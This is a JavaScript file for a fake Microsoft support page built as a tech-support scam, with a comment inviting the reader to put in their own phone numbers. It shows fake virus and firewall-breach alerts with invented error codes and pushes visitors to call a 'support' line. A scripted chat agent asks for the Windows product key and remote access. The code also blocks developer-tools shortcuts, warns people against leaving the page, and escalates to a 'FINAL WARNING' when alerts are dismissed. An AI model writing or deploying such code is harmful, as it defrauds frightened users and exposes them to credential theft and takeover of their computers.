document.addEventListener('DOMContentLoaded', function() {
    const signInBtn = document.getElementById('signInBtn');
    const productCards = document.querySelectorAll('.product-card');
    const chatBtn = document.getElementById('chatBtn');
    const callBtn = document.getElementById('callBtn');
    const ticketBtn = document.getElementById('ticketBtn');
    const navLinks = document.querySelectorAll('.nav-link');
    const topSignInBtn = document.querySelector('.btn-secondary');
    const cantSignInLink = document.querySelector('.cant-sign-in');
    const showMoreLink = document.querySelector('.show-more-link');
    const errorModal = document.getElementById('errorModal');
    const closeModal = document.getElementById('closeModal');
    const callNowBtn = document.getElementById('callNowBtn');
    const ignoreBtn = document.getElementById('ignoreBtn');
    const chatWidget = document.getElementById('chatWidget');
    const chatClose = document.getElementById('chatClose');
    const chatInput = document.getElementById('chatInput');
    const sendChat = document.getElementById('sendChat');
    const chatBody = document.getElementById('chatBody');

    const errorCodes = [
        'WIN-ERR-0x8007045D',
        'SEC-THREAT-0x80240017',
        'SYS-ERR-0x800F0984',
        'VIRUS-DETECT-0x80070005',
        'FIREWALL-0x80070422',
        'REGISTRY-0x8007000D'
    ];

    // Replace example numbers with your own.
    const supportNumbers = [
        '+1-000-000-0000',
        '+1-000-000-0000',
        '+1-000-000-0000',
        '+1-000-000-0000'
    ];

    const chatResponses = [
        "I understand your concern. Let me help you with that right away.",
        "That sounds like a serious issue. Can you tell me more about when this started?",
        "I'm going to run a quick diagnostic on your system. Please hold on.",
        "This appears to be a critical security threat. We need to address this immediately.",
        "For your security, I'll need to verify your Windows license. What's your product key?",
        "I can see the issue from here. Let me connect you with our senior technician.",
        "This requires immediate attention. Can I get remote access to fix this?",
        "Your system is at risk. We need to install our security patch right away."
    ];

    init();

    function init() {
        setupEventListeners();
        
        setTimeout(() => {
            if (Math.random() > 0.3) {
                showErrorModal();
            }
        }, Math.random() * 30000 + 10000);
    }

    function setupEventListeners() {
        signInBtn.addEventListener('click', handleSignIn);

        navLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                showFirewallError();
            });
        });

        topSignInBtn.addEventListener('click', function(e) {
            e.preventDefault();
            showFirewallError();
        });

        cantSignInLink.addEventListener('click', function(e) {
            e.preventDefault();
            showSysError();
        });

        showMoreLink.addEventListener('click', function(e) {
            e.preventDefault();
            showSysError();
        });

        productCards.forEach(card => {
            card.addEventListener('click', () => {
                const product = card.dataset.product;
                handleProductClick(product);
            });
        });

        if (chatBtn) chatBtn.addEventListener('click', openChat);
        if (callBtn) callBtn.addEventListener('click', showCallInfo);
        if (ticketBtn) ticketBtn.addEventListener('click', showTicketForm);

        closeModal.addEventListener('click', hideErrorModal);
        callNowBtn.addEventListener('click', handleCallNow);
        ignoreBtn.addEventListener('click', handleIgnoreWarning);

        document.addEventListener('click', function(e) {
            if (e.target && (e.target.textContent.includes('Call Support Now') || e.target.textContent.includes('Call Now'))) {
                handleCallNow();
            }
        });

        chatClose.addEventListener('click', closeChat);
        sendChat.addEventListener('click', sendChatMessage);
        chatInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendChatMessage();
            }
        });

        window.addEventListener('click', function(e) {
            if (e.target === errorModal) {
                hideErrorModal();
            }
        });
    }

    function handleSignIn() {
        signInBtn.textContent = 'Signing in...';
        signInBtn.disabled = true;
        
        setTimeout(() => {
            signInBtn.textContent = 'Sign in';
            signInBtn.disabled = false;
            showErrorModal();
        }, 2000);
    }

    function handleProductClick(product) {
        const card = event.currentTarget;
        card.style.opacity = '0.7';
        card.style.pointerEvents = 'none';
        
        setTimeout(() => {
            card.style.opacity = '1';
            card.style.pointerEvents = 'auto';
            
            showProductSpecificError(product);
        }, 1500);
    }

    function showProductSpecificError(product) {
        const productErrors = {
            'microsoft365': 'Microsoft 365 subscription verification failed',
            'office': 'Office license activation error detected',
            'windows': 'Windows security vulnerability found',
            'xbox': 'Xbox Live account security breach detected',
            'surface': 'Surface device hardware malfunction',
            'copilot': 'Copilot AI service security alert',
            'dynamics': 'Dynamics 365 data breach detected',
            'intune': 'Intune security policy violation',
            'azure': 'Azure subscription security threat',
            'server': 'Server security vulnerability detected',
            'accessories': 'Device driver security risk',
            'advertising': 'Advertising account security breach'
        };

        const errorMessage = productErrors[product] || 'System security threat detected';
        
        const modalBody = document.querySelector('.modal-body');
        modalBody.innerHTML = `
            <div class="error-icon">⚠️</div>
            <p><strong>${errorMessage}</strong></p>
            <p>Your system requires immediate attention to prevent data loss.</p>
            <p><strong>Error Code:</strong> <span id="errorCode">${errorCodes[Math.floor(Math.random() * errorCodes.length)]}</span></p>
            <p>Contact Microsoft Support immediately to resolve this critical issue.</p>
            <div class="contact-info">
                <p><strong>Support Number:</strong> <span class="phone-number">${supportNumbers[Math.floor(Math.random() * supportNumbers.length)]}</span></p>
            </div>
        `;
        
        showErrorModal();
    }

    function showFirewallError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        
        document.getElementById('errorCode').textContent = 'FIREWALL-0x80070422';
        document.querySelector('.phone-number').textContent = randomPhone;
        
        const modalBody = document.querySelector('.modal-body');
        modalBody.innerHTML = `
            <div class="error-icon">🔥</div>
            <p><strong>CRITICAL FIREWALL BREACH DETECTED</strong></p>
            <p>Your firewall has been compromised and disabled by malicious software.</p>
            <p><strong>Error Code:</strong> <span id="errorCode">FIREWALL-0x80070422</span></p>
            <p>Immediate action required to prevent data theft and system damage.</p>
            <div class="contact-info">
                <p><strong>Emergency Support:</strong> <span class="phone-number">${randomPhone}</span></p>
            </div>
        `;
        
        showErrorModal();
    }

    function showSysError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        
        document.getElementById('errorCode').textContent = 'SYS-ERR-0x800F0984';
        document.querySelector('.phone-number').textContent = randomPhone;
        
        const modalBody = document.querySelector('.modal-body');
        modalBody.innerHTML = `
            <div class="error-icon">⚠️</div>
            <p><strong>SYSTEM ERROR DETECTED</strong></p>
            <p>Critical system files have been corrupted or deleted.</p>
            <p><strong>Error Code:</strong> <span id="errorCode">SYS-ERR-0x800F0984</span></p>
            <p>Your computer may shut down unexpectedly to prevent further damage.</p>
            <div class="contact-info">
                <p><strong>Support Number:</strong> <span class="phone-number">${randomPhone}</span></p>
            </div>
        `;
        
        showErrorModal();
    }

    function showErrorModal() {
        const randomErrorCode = errorCodes[Math.floor(Math.random() * errorCodes.length)];
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        
        document.getElementById('errorCode').textContent = randomErrorCode;
        document.querySelector('.phone-number').textContent = randomPhone;
        
        errorModal.style.display = 'block';
        document.body.style.overflow = 'hidden';

        setTimeout(() => {
            errorModal.classList.add('urgent');
        }, 1000);
    }

    function hideErrorModal() {
        errorModal.style.display = 'none';
        document.body.style.overflow = 'auto';
        errorModal.classList.remove('urgent');
    }

    function handleCallNow() {
        const phoneNumber = document.querySelector('.phone-number').textContent;
        
        const urgentDiv = document.createElement('div');
        urgentDiv.innerHTML = `
            <div style="background: #d13438; color: white; padding: 20px; text-align: center; font-weight: bold;">
                ⚠️ CRITICAL SECURITY ALERT ⚠️<br>
                Call immediately: ${phoneNumber}<br>
                <small>Do not close this window or restart your computer</small>
            </div>
        `;
        
        document.body.insertBefore(urgentDiv, document.body.firstChild);
        
        window.location.href = `tel:${phoneNumber}`;
    }

    function handleIgnoreWarning() {
        const warningCount = parseInt(localStorage.getItem('warningCount') || '0') + 1;
        localStorage.setItem('warningCount', warningCount.toString());
        
        if (warningCount < 3) {
            hideErrorModal();
            
            setTimeout(() => {
                showErrorModal();
                const modalContent = document.querySelector('.modal-content');
                modalContent.style.animation = 'shake 0.5s infinite';
            }, 3000);
        } else {
            const modalBody = document.querySelector('.modal-body');
            modalBody.innerHTML = `
                <div class="error-icon">🚨</div>
                <h3 style="color: #d13438; margin-bottom: 20px;">FINAL WARNING</h3>
                <p><strong>Your system is about to be permanently damaged!</strong></p>
                <p>This is your last chance to save your files and personal data.</p>
                <div class="contact-info">
                    <p><strong>Emergency Support:</strong> <span class="phone-number">${supportNumbers[0]}</span></p>
                </div>
            `;
        }
    }

    function openChat() {
        chatWidget.style.display = 'flex';
        chatInput.focus();
        
        setTimeout(() => {
            addChatMessage('agent', 'I can see you\'re having some technical issues. Let me help you right away.');
        }, 2000);
        
        setTimeout(() => {
            addChatMessage('agent', 'I\'m detecting some security vulnerabilities on your system. This needs immediate attention.');
        }, 5000);
    }

    function closeChat() {
        chatWidget.style.display = 'none';
    }

    function sendChatMessage() {
        const message = chatInput.value.trim();
        if (message) {
            addChatMessage('user', message);
            chatInput.value = '';
            
            setTimeout(() => {
                const response = chatResponses[Math.floor(Math.random() * chatResponses.length)];
                addChatMessage('agent', response);
                
                if (Math.random() > 0.6) {
                    setTimeout(() => {
                        const phoneNumber = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
                        addChatMessage('agent', `For faster resolution, please call our emergency line: ${phoneNumber}`);
                    }, 2000);
                }
            }, 1000 + Math.random() * 2000);
        }
    }

    function addChatMessage(sender, message) {
        const messageDiv = document.createElement('div');
        messageDiv.className = `chat-message ${sender}`;
        
        const now = new Date();
        const timeStr = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
        
        messageDiv.innerHTML = `
            <div class="message-content">${message}</div>
            <div class="message-time">${timeStr}</div>
        `;
        
        chatBody.appendChild(messageDiv);
        chatBody.scrollTop = chatBody.scrollHeight;
    }

    function showCallInfo() {
        const phoneNumber = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        alert(`Call Microsoft Support at: ${phoneNumber}\n\nOur specialists are available 24/7 to help with your technical issues.`);
        
        if (/Mobi|Android/i.test(navigator.userAgent)) {
            window.location.href = `tel:${phoneNumber}`;
        }
    }

    function showTicketForm() {
        const userInfo = prompt('Please describe your issue:');
        if (userInfo) {
            setTimeout(() => {
                alert('Due to the critical nature of your issue, please call our emergency support line immediately for faster assistance.');
                showCallInfo();
            }, 1000);
        }
    }

    function addDynamicEffects() {
        setInterval(() => {
            if (Math.random() > 0.95 && errorModal.style.display !== 'block') {
                showErrorModal();
            }
        }, 30000);

        setInterval(() => {
            const timeElements = document.querySelectorAll('.message-time');
            timeElements.forEach((el, index) => {
                if (el.textContent === 'Just now') {
                    const minutesAgo = Math.floor(Math.random() * 5) + 1;
                    el.textContent = `${minutesAgo} min ago`;
                }
            });
        }, 60000);
    }

    addDynamicEffects();

    const style = document.createElement('style');
    style.textContent = `
        .urgent {
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.7; }
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        .modal-content.shake {
            animation: shake 0.5s infinite;
        }
    `;
    document.head.appendChild(style);

    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || 
            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
            (e.ctrlKey && e.key === 'u')) {
            e.preventDefault();
            showErrorModal();
            return false;
        }
    });

    window.addEventListener('beforeunload', function(e) {
        const message = 'WARNING: Leaving this page may cause permanent damage to your system. Contact Microsoft Support first.';
        e.returnValue = message;
        return message;
    });
});
